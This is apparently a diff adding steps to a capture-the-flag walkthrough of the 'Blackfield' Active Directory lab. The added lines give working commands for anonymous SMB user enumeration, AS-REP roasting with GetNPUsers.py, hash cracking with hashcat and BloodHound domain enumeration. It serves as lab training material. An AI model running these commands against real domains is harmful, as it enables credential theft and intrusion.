@@ -31,4 +31,20 @@
 
 <img width="912" height="443" alt="image" src="https://github.com/user-attachments/assets/d44570cb-edcc-41f3-a6af-2078cdb5ab70" />
 
-2. SMB allows anonymous logon. We find a profiles$ share that has a list of users so create a user list from it. Then, 
+2. SMB allows anonymous logon. We find a profiles$ share that has a list of users so create a user list from it.
+
+`smbclient //blackfield.local/profiles$ -U '' -c ls | awk '{print $1}' > users.list`
+
+3. Now that we have a users list, we will try ASREPRoasting to get a user hash and gain an initial foothold in the domain.
+
+`GetNPUsers.py -request -usersfile users.list -outputfile asreproastables.txt -dc-ip 10.129.229.17 -format hashcat 'blackfield.local/'`
+
+
+
+4. Success! Now crack the hash and we get user support's credentials. 
+
+`hashcat -m 18200 asreproastables.txt /usr/share/wordlists/rockyou.txt`
+
+5. Now that we have a valid credentials on the domain, we run Bloodhound to enumerate the network
+
+`sudo bloodhound-python -d blackfield.local -u support -p $(cat recon/support.pass) -ns 10.129.229.17 -c all` 
